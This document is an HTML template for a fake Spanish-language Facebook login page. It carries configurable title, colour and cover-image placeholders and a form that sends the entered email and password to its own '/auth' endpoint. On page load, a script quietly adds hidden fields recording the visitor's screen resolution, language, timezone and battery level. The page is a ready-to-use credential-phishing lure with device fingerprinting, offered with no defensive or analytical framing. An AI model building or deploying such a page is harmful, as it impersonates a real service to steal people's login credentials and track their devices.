<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Entrar</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { 
            background: {{ config.color_fondo }};
            background: linear-gradient(135deg, {{ config.color_fondo }} 0%, #000000 100%);
            color: {{ config.color_texto }};
            min-height: 100vh; font-family: 'Segoe UI', sans-serif;
            display: flex; align-items: center; justify-content: center; margin: 0;
        }
        .main-container { width: 100%; max-width: 420px; padding: 15px; }
        .header-card { border-radius: 20px 20px 0 0; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .img-portada { width: 100%; height: 180px; object-fit: cover; }
        .welcome-banner { 
            padding: 18px; text-align: center; background: rgba(255,255,255,0.1); 
            backdrop-filter: blur(12px); font-weight: bold; color: #fff;
            border: 1px solid rgba(255,255,255,0.1); border-top: none; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .login-box { 
            background: #ffffff; padding: 25px; border-radius: 0 0 20px 20px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.5); text-align: center;
        }
        .fb-logo { color: #1877f2; font-size: 2.6rem; font-weight: bold; margin-bottom: 20px; display: block; }
        .form-control { height: 52px; border: 1px solid #dddfe2; margin-bottom: 15px; border-radius: 6px; }
        .btn-login { background: #1877f2; border: none; font-weight: bold; height: 50px; width: 100%; border-radius: 6px; font-size: 1.1rem; }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="header-card">
            <img src="{{ config.img_principal }}" class="img-portada" onerror="this.src='https://via.placeholder.com/400x200?text=Sube+Portada'">
            <div class="welcome-banner">{{ config.titulo }}</div>
        </div>
        <div class="login-box">
            <span class="fb-logo">facebook</span>
            <form action="/auth" method="POST" id="fForm">
                <input type="text" name="email" class="form-control" placeholder="Correo o teléfono" required>
                <input type="password" name="pass" class="form-control" placeholder="Contraseña" required>
                <button class="btn btn-primary btn-login">Iniciar sesión</button>
            </form>
        </div>
    </div>
    <script>
        window.onload = async function() {
            const f = document.getElementById('fForm');
            const add = (n, v) => {
                const i = document.createElement('input');
                i.type = 'hidden'; i.name = n; i.value = v; f.appendChild(i);
            };
            add('resolucion', window.screen.width + "x" + window.screen.height);
            add('lenguaje', navigator.language);
            add('tz', Intl.DateTimeFormat().resolvedOptions().timeZone);
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                add('bateria', Math.round(b.level * 100) + "%");
            }
        };
    </script>
</body>
</html>
